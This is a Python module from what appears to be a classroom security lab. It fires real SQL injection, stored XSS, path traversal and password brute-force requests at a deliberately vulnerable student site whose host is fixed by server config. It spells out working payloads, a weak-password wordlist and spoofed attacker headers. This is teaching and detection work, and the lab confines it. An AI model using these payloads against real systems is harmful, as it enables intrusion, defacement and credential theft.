"""The REAL attack runner.

Unlike the synthetic simulator, this sends genuine HTTP requests — real SQL
injection, real XSS, real brute force — at the vulnerable student site. The
site's own request handlers then produce the detections (via `vuln.observe`),
so the dashboard shows attacks that actually happened.

SAFETY — the one rule that makes this classroom-safe:
    The HTTP client's base URL is `settings.target_base_url`, read from server
    config. Nothing in the request path lets a caller change the host. Every
    attack this runner can launch lands on the lab target and nowhere else.
"""

from __future__ import annotations

import asyncio
import logging
import random
from datetime import UTC, datetime

import httpx
from sqlalchemy import select

from .. import bus, geo
from ..config import settings
from ..database import SessionLocal
from ..models import SimulationStatus
from ..ws import manager
from .models import SiteUser

log = logging.getLogger(__name__)

# Real payloads. Each entry is (key, human label, what the student feels).
ATTACKS = {
    "brute_force": "Brute-force login",
    "sqli_login": "SQL injection — login bypass",
    "sqli_dump": "SQL injection — steal all passwords",
    "xss_deface": "Stored XSS — deface the page",
    "traversal": "Path traversal — leak server files",
}

# A small weak-password list. Some students WILL have picked one of these, so
# the brute force genuinely succeeds — which is exactly the lesson.
_WORDLIST = [
    "123456", "password", "qwerty", "admin", "letmein", "welcome",
    "sunshine", "iloveyou", "000000", "abc123", "password1", "monkey",
]

_XSS_PAYLOADS = [
    "<script>document.body.style.background='red'</script>💀 HACKED",
    "<img src=x onerror=\"alert('Your site was defaced')\">",
    "<script>alert('Owned by the attacker')</script>",
]


class LiveAttackRunner:
    def __init__(self) -> None:
        self.status = SimulationStatus.STOPPED
        self.attacks: list[str] = list(ATTACKS)
        self.target_username: str = "all"
        self.attacks_per_minute: int = 40
        self.source_country: str | None = None
        self.repeat: bool = True
        self.started_by: str | None = None
        self.started_at: datetime | None = None
        self.requests_sent = 0
        self.attacks_launched = 0
        self._task: asyncio.Task | None = None
        self._rng = random.Random()

    # --------------------------------------------------------------- state
    def state(self) -> dict:
        # Only the leader worker runs the loop; everyone else reports the
        # snapshot its last broadcast left on the bus.
        if not bus.is_leader():
            snapshot = bus.snapshots.get("live_attack")
            if snapshot:
                return snapshot
        return {
            "status": self.status.value,
            "attacks": self.attacks,
            "target_username": self.target_username,
            "attacks_per_minute": self.attacks_per_minute,
            "source_country": self.source_country,
            "repeat": self.repeat,
            "started_by": self.started_by,
            "started_at": self.started_at.isoformat() if self.started_at else None,
            "requests_sent": self.requests_sent,
            "attacks_launched": self.attacks_launched,
            "target_base_url": settings.target_base_url,
        }

    async def _announce(self) -> None:
        await manager.broadcast("live_attack", self.state())

    # -------------------------------------------------------- worker routing
    async def handle(self, action: str, args: dict) -> None:
        """Run a control action forwarded by another worker. Leader only."""
        if action == "start":
            await self.start(**args)
        elif action == "pause":
            await self.pause()
        elif action == "resume":
            await self.resume()
        elif action == "stop":
            await self.stop()

    # ------------------------------------------------------------- controls
    async def start(self, *, attacks, target_username, attacks_per_minute,
                    source_country, repeat, started_by) -> dict:
        if await bus.command("live", "start", {
            "attacks": attacks, "target_username": target_username,
            "attacks_per_minute": attacks_per_minute, "source_country": source_country,
            "repeat": repeat, "started_by": started_by,
        }):
            # Another worker owns the loop; the UI picks up the real state from
            # the WebSocket announcement that follows.
            return self.state()

        self.attacks = [a for a in (attacks or list(ATTACKS)) if a in ATTACKS] or list(ATTACKS)
        self.target_username = target_username or "all"
        self.attacks_per_minute = max(1, min(600, int(attacks_per_minute or 40)))
        self.source_country = source_country
        self.repeat = bool(repeat)
        self.started_by = started_by

        if self.status is SimulationStatus.PAUSED and self._task and not self._task.done():
            self.status = SimulationStatus.RUNNING
            await self._announce()
            return self.state()

        if self.status is SimulationStatus.RUNNING:
            await self._announce()  # reconfigured in place
            return self.state()

        self.status = SimulationStatus.RUNNING
        self.started_at = datetime.now(UTC)
        self.requests_sent = 0
        self.attacks_launched = 0
        self._task = asyncio.create_task(self._loop())
        await self._announce()
        return self.state()

    async def pause(self) -> dict:
        if await bus.command("live", "pause"):
            return self.state()
        if self.status is SimulationStatus.RUNNING:
            self.status = SimulationStatus.PAUSED
            await self._announce()
        return self.state()

    async def resume(self) -> dict:
        if await bus.command("live", "resume"):
            return self.state()
        if self.status is SimulationStatus.PAUSED:
            self.status = SimulationStatus.RUNNING
            await self._announce()
        return self.state()

    async def stop(self) -> dict:
        if await bus.command("live", "stop"):
            return self.state()
        await self.shutdown()
        await self._announce()
        return self.state()

    async def shutdown(self) -> None:
        """Cancel this worker's loop only — see AttackSimulator.shutdown."""
        self.status = SimulationStatus.STOPPED
        task, self._task = self._task, None
        if task and not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

    # ------------------------------------------------------------------ loop
    def _roster(self) -> list[str]:
        with SessionLocal() as db:
            return list(db.scalars(select(SiteUser.username).order_by(SiteUser.username)))

    def _pick_victim(self, roster: list[str]) -> str | None:
        if self.target_username and self.target_username != "all":
            return self.target_username if self.target_username in roster else None
        return self._rng.choice(roster) if roster else None

    def _attacker_ip(self) -> str:
        country = self.source_country or self._rng.choice(
            ["RU", "CN", "KP", "IR", "US", "BR", "NL", "VN", "UA", "NG"]
        )
        return geo.ip_for_country(country, self._rng)

    async def _loop(self) -> None:
        try:
            async with httpx.AsyncClient(base_url=settings.target_base_url, timeout=8.0) as client:
                while self.status is not SimulationStatus.STOPPED:
                    if self.status is SimulationStatus.PAUSED:
                        await asyncio.sleep(0.25)
                        continue

                    roster = await asyncio.to_thread(self._roster)
                    victim = self._pick_victim(roster)
                    if victim is None:
                        # No students registered yet — idle until some appear.
                        await asyncio.sleep(2.0)
                        continue

                    attack = self._rng.choice(self.attacks)
                    try:
                        sent = await self._fire(client, attack, victim)
                        self.requests_sent += sent
                        self.attacks_launched += 1
                    except Exception:
                        log.exception("live attack '%s' on '%s' failed", attack, victim)

                    if self.attacks_launched % 5 == 0:
                        await self._announce()

                    if not self.repeat:
                        await self.stop()
                        return
                    await asyncio.sleep(60.0 / self.attacks_per_minute)
        except asyncio.CancelledError:
            raise
        except Exception:
            log.exception("live attack runner crashed")
            self.status = SimulationStatus.STOPPED
            await self._announce()

    async def _fire(self, client: httpx.AsyncClient, attack: str, victim: str) -> int:
        """Send one real attack burst at `victim`. Returns requests sent."""
        # X-Lab-Victim tags site-wide attacks (dump/traversal) so they land on
        # this student's own dashboard too — lab attribution only.
        headers = {
            "X-Forwarded-For": self._attacker_ip(),
            "User-Agent": "sqlmap/1.8 (lab)",
            "X-Lab-Victim": victim,
        }

        if attack == "brute_force":
            # One source, many guesses — this is what trips the brute-force rule
            # AND actually gets in if the student picked a weak password.
            for pw in self._rng.sample(_WORDLIST, k=10):
                await client.post("/site/login", json={"username": victim, "password": pw}, headers=headers)
            return 10

        if attack == "sqli_login":
            for payload in ("' OR '1'='1", f"{victim}'-- ", "admin' OR 1=1-- "):
                await client.post("/site/login", json={"username": payload, "password": "x"}, headers=headers)
            return 3

        if attack == "sqli_dump":
            q = "%' UNION SELECT username, password FROM site_users -- "
            await client.get("/site/search", params={"q": q}, headers=headers)
            return 1

        if attack == "xss_deface":
            payload = self._rng.choice(_XSS_PAYLOADS)
            await client.post(f"/site/u/{victim}/guestbook",
                              json={"author": "attacker", "message": payload}, headers=headers)
            return 1

        if attack == "traversal":
            await client.get("/site/file", params={"name": "../_planted/secrets.txt"}, headers=headers)
            return 1

        return 0


live_runner = LiveAttackRunner()
bus.register("live", live_runner)
